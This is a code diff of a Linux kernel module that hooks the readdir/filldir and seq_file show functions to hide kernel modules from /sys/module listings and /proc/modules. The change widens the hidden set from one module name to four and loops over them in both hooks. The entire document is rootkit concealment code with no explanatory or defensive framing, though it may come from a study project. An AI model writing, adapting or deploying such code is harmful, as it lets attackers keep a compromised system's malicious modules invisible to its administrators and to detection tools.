@@ -33,7 +33,7 @@ MODULE_LICENSE("GPL");
 
 # define ROOT_PATH "/sys/module"
 # define PROC_PATH "/proc/modules"
-# define SECRET_MODULE "kohidko"
+char *SECRET_MODULES[] = {"kohidko", "pthidko", "fshidko", "pshidko"};
 
 int
 (*real_readdir)(struct file *filp, void *dirent, filldir_t filldir);
@@ -100,9 +100,12 @@ int
 fake_filldir(void *dirent, const char *name, int namlen,
              loff_t offset, u64 ino, unsigned d_type)
 {
-    if (strcmp(name, SECRET_MODULE) == 0) {
-        fm_alert("Hiding module: %s", name);
-        return 0;
+    int i;
+    for (i=0; i<sizeof(SECRET_MODULES)/sizeof(SECRET_MODULES[0]); i++) {
+        if (strcmp(name, SECRET_MODULES[i]) == 0) {
+            fm_alert("Hiding module: %s", name);
+            return 0;
+        }
     }
 
     return real_filldir(dirent, name, namlen, offset, ino, d_type);
@@ -114,15 +117,18 @@ fake_seq_show(struct seq_file *seq, void *v)
 {
     int ret;
     size_t last_count, last_size;
+    int i;
 
     last_count = seq->count;
     ret =  real_seq_show(seq, v);
     last_size = seq->count - last_count;
 
-    if (strnstr(seq->buf + seq->count - last_size, SECRET_MODULE,
-                last_size)) {
-        fm_alert("Hiding module: %s\n", SECRET_MODULE);
-        seq->count -= last_size;
+    for (i=0; i<sizeof(SECRET_MODULES)/sizeof(SECRET_MODULES[0]); i++) {
+        if (strnstr(seq->buf + seq->count - last_size, SECRET_MODULES[i],
+                    last_size)) {
+            fm_alert("Hiding module: %s\n", SECRET_MODULES[i]);
+            seq->count -= last_size;
+        }
     }
 
     return ret;
